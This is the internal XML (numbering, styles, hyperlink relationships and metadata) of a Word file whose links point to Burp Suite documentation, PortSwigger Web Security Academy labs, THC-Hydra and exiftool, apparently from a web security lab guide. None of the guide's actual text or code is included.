    <w:lvl w:ilvl="1" w:tplc="D53008A6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="31DAFFD6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="525C121A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="CF28E888">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="3A94A53A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="4ADC6084">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="1CA44454">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="95568B0A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="19" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6E5F6C57"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000002"/>
    <w:lvl w:ilvl="0" w:tplc="D7CAE59A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="C4CEBFCA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="3064EB94">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="1026FB6C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="14C07372">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="5700256C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="111A8B8C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="000AE98E">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="9EF815FE">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="20" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="741E61D9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000001"/>
    <w:lvl w:ilvl="0" w:tplc="BBF093A8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="03E85AB4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="062C0B2C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="0BA2A6D2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="5FB8A0EC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="EB720766">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="57EC68CA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="69FA06C0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="726296BA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="21" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="7C4FADD3"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000001"/>
    <w:lvl w:ilvl="0" w:tplc="5C2EE574">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="36DAAAA0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="4C4C7FDC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="B644F142">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="FD5C677A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="222A2162">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="1350443A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="D68673B6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="8232447A">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18"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="1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2"/>
  </w:compat>
  <w:rsids>
    <w:rsidRoot w:val="00B3581B"/>
    <w:rsid w:val="003F20FB"/>
    <w:rsid w:val="00B358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7530"/>
  <w15:docId w15:val="{FEB32B9F-AEDF-4032-9EA6-79583F9B0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paragraph" w:styleId="Heading4">
    <w:name w:val="heading 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00EF7B96"/>
    <w:pPr>
      <w:keepNext/>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ncedCodehttp">
    <w:name w:val="FencedCode.http"/>
    <w:pPr>
      <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FencedCodehtml">
    <w:name w:val="FencedCode.html"/>
    <w:pPr>
      <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="InlineCode">
    <w:name w:val="InlineCode"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:color w:val="C7254E"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:highlight w:val="white"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FencedCodesh">
    <w:name w:val="FencedCode.sh"/>
    <w:pPr>
      <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00EF7B96"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FencedCodephp">
    <w:name w:val="FencedCode.php"/>
    <w:pPr>
      <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FencedCodepython">
    <w:name w:val="FencedCode.python"/>
    <w:pPr>
      <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FencedCodexml">
    <w:name w:val="FencedCode.xml"/>
    <w:pPr>
      <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FencedCodedtd">
    <w:name w:val="FencedCode.dtd"/>
    <w:pPr>
      <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FencedCodejavascript">
    <w:name w:val="FencedCode.javascript"/>
    <w:pPr>
      <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="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portswigger.net/burp/documentation/desktop/tools/proxy/using" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/vulnerability-scanner" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/repeater/using" TargetMode="External"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/repeater/using" TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/proxy" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/dom-invader" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/numbering" Target="numbering.xml"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/vulnerability-scanner" TargetMode="External"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../customXml/item1.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/vulnerability-scanner" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/intruder/using" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/proxy" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/proxy/using"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xiftool.org/" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100" TargetMode="External"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/intruder/using" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/repeater" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/repeater" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/proxy" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/intruder/using" TargetMode="External"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/vulnerability-scanner" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/proxy" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/repeater/using" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/repeater" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/vanhauser-thc/thc-hydra" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/vanhauser-thc/thc-hydra" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/proxy" TargetMode="External"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/collaborator" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/web-security/csrf" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://exiftool.org/" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/intruder/using" TargetMode="External"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/proxy/using" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/repeater" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/intruder/using" TargetMode="External"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/repeater" TargetMode="External"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/tools/repeater/u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0FE9D-517F-483C-B249-C40B1B360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35</Pages>
  <Words>7903</Words>
  <Characters>45053</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cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-01-12T08:10:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-01-12T08:14:00Z</dcterms:modified>
</cp:coreProperties>
</file>